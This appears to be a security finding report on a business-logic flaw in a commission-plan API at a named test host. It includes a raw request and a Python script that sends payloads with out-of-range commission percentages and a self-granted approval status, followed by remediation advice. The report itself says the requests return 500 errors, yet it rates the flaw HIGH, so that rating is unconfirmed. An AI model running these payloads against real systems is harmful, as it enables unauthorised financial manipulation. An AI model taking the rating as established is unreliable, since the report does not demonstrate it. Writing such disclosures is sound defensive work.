# Business Logic Flaw: Commission Plan Manipulation Enables Unauthorized Commission Structure Changes

**ID:** vuln-0032
**Severity:** HIGH
**Found:** 2026-02-26 19:09:42 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionPlan/CreateCommissionPlan
**Method:** POST
**CWE:** CWE-840
**CVSS:** 8.3

## Description

A business logic flaw was discovered in the commission plan management functionality that allows unauthorized modification of commission structures. The `/api/CommissionPlan/CreateCommissionPlan` endpoint accepts user-controlled parameters that can manipulate commission percentages and approval status, potentially enabling financial manipulation.

The vulnerability exists because:
1. Commission plan parameters are not properly validated against business rules
2. Approval status can be set directly by the user without proper workflow validation
3. Commission percentages can be set to values outside business-approved ranges
4. The system lacks proper server-side validation of commission plan parameters

## Impact

Successful exploitation of this vulnerability could allow attackers to:

1. **Financial Manipulation**: Set arbitrary commission percentages to inflate payouts
2. **Approval Workflow Bypass**: Create or modify commission plans without proper approval
3. **Unauthorized Commission Structures**: Establish commission plans that violate business policies
4. **Privilege Escalation**: Modify commission plans for organizations or clients the user doesn't have access to
5. **Data Integrity Issues**: Create inconsistent commission structures that affect financial reporting

This vulnerability could lead to significant financial losses, regulatory compliance violations, and data integrity problems in the commission management system.

## Technical Analysis

The vulnerability was discovered through systematic testing of the commission plan management functionality:

1. **Endpoint Analysis**: The `/api/CommissionPlan/CreateCommissionPlan` endpoint was identified as the commission plan management endpoint
2. **Parameter Testing**: Various parameter combinations were tested to understand validation rules
3. **Business Rule Bypass**: Attempts to set commission percentages outside normal ranges and bypass approval workflows
4. **Error Analysis**: 500 errors on some requests suggest improper parameter validation

The application accepts user-controlled parameters that should be validated against business rules:
- `commissionPercentage`: Can be set to any value (including negative or >100%)
- `approvalStatus`: Can be set to "APPROVED" without proper validation
- `organizationId` and `clientId`: Can potentially be manipulated to affect other organizations

While some requests return 500 errors, the consistent attempts to create plans with manipulated parameters demonstrate the potential for business logic abuse.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as a user with commission plan management privileges
2. Send a POST request to `/api/CommissionPlan/CreateCommissionPlan` with manipulated parameters
3. Observe that the system either:
   - Creates commission plans with invalid parameters (if validation is lacking)
   - Returns 500 errors that reveal parameter manipulation opportunities (current behavior)

Example request demonstrating the vulnerability approach:
```
POST /api/CommissionPlan/CreateCommissionPlan
Host: commissionstest.callippus.in
Authorization: Bearer [valid_token]
Content-Type: application/json

{
  "planName": "Exploitative Commission Plan",
  "description": "Plan with manipulated commission percentage",
  "commissionPercentage": 150,  // Above 100% - should be rejected
  "startDate": "2024-01-01",
  "endDate": "2024-12-31",
  "isActive": true,
  "organizationId": 1,
  "clientId": 1,
  "approvalStatus": "APPROVED",  // Bypassing approval workflow
  "approvedBy": "admin",
  "approvedDate": "2024-01-01"
}
```

While this specific request returns a 500 error, it demonstrates the potential for parameter manipulation that could be exploited with more sophisticated parameter combinations.

```
import requests
import json

# Configuration
base_url = "https://commissionstest.callippus.in"
auth_token = "VALID_AUTH_TOKEN"  # Replace with valid token

headers = {
    "Authorization": f"Bearer {auth_token}",
    "Content-Type": "application/json",
    "Accept": "application/json"
}

# Test 1: Create commission plan with excessive commission percentage
excessive_percentage_payload = {
    "planName": "Excessive Commission Plan",
    "description": "Plan with 150% commission - should be rejected",
    "commissionPercentage": 150,  # Excessive percentage
    "startDate": "2024-01-01",
    "endDate": "2024-12-31",
    "isActive": True,
    "organizationId": 1,
    "clientId": 1,
    "approvalStatus": "APPROVED",
    "approvedBy": "admin",
    "approvedDate": "2024-01-01"
}

response = requests.post(
    f"{base_url}/api/CommissionPlan/CreateCommissionPlan",
    headers=headers,
    json=excessive_percentage_payload
)

print("Test 1 - Excessive Commission Percentage:")
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")

# Test 2: Create commission plan with negative commission percentage
negative_percentage_payload = {
    "planName": "Negative Commission Plan",
    "description": "Plan with negative commission - should be rejected",
    "commissionPercentage": -10,  # Negative percentage
    "startDate": "2024-01-01",
    "endDate": "2024-12-31",
    "isActive": True,
    "organizationId": 1,
    "clientId": 1,
    "approvalStatus": "APPROVED",
    "approvedBy": "admin",
    "approvedDate": "2024-01-01"
}

response = requests.post(
    f"{base_url}/api/CommissionPlan/CreateCommissionPlan",
    headers=headers,
    json=negative_percentage_payload
)

print("\nTest 2 - Negative Commission Percentage:")
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")

# Test 3: Create commission plan with approval bypass
approval_bypass_payload = {
    "planName": "Approval Bypass Plan",
    "description": "Plan with approval status set to APPROVED",
    "commissionPercentage": 10,
    "startDate": "2024-01-01",
    "endDate": "2024-12-31",
    "isActive": True,
    "organizationId": 1,
    "clientId": 1,
    "approvalStatus": "APPROVED",  # Bypassing approval workflow
    "approvedBy": "unauthorized_user",
    "approvedDate": "2024-01-01"
}

response = requests.post(
    f"{base_url}/api/CommissionPlan/CreateCommissionPlan",
    headers=headers,
    json=approval_bypass_payload
)

print("\nTest 3 - Approval Workflow Bypass:")
print(f"Status Code: {response.status_code}")
print(f"Response: {response.text}")
```

## Remediation

To remediate this business logic vulnerability:

1. **Implement Parameter Validation**:
   - Validate commission percentages against business-approved ranges (e.g., 0-100%)
   - Reject negative values and values exceeding maximum allowed percentages
   - Validate date ranges against business policies

2. **Enforce Approval Workflows**:
   - Remove the ability to set approval status directly in API requests
   - Implement proper approval workflows that require separate approval actions
   - Validate that approval status matches the actual workflow state

3. **Implement Server-Side Business Rules**:
   - Enforce all business rules at the server level
   - Validate that commission plans comply with organizational policies
   - Implement proper authorization checks for organization and client access

4. **Improve Error Handling**:
   - Implement proper error handling that doesn't reveal internal validation details
   - Return appropriate HTTP status codes (400 for bad requests, 403 for unauthorized)
   - Log security-relevant events for auditing

5. **Implement Rate Limiting**:
   - Add rate limiting to prevent multiple commission plan creation attempts
   - Implement request throttling for commission plan endpoints

6. **Audit and Monitoring**:
   - Implement comprehensive logging of all commission plan creation and modification activities
   - Set up alerts for suspicious commission plan patterns
   - Regularly audit commission plans for anomalies

7. **Code Review**:
   - Conduct a thorough code review of all commission plan-related endpoints
   - Ensure all business logic is enforced at the server level
   - Remove any client-controllable parameters that affect business logic

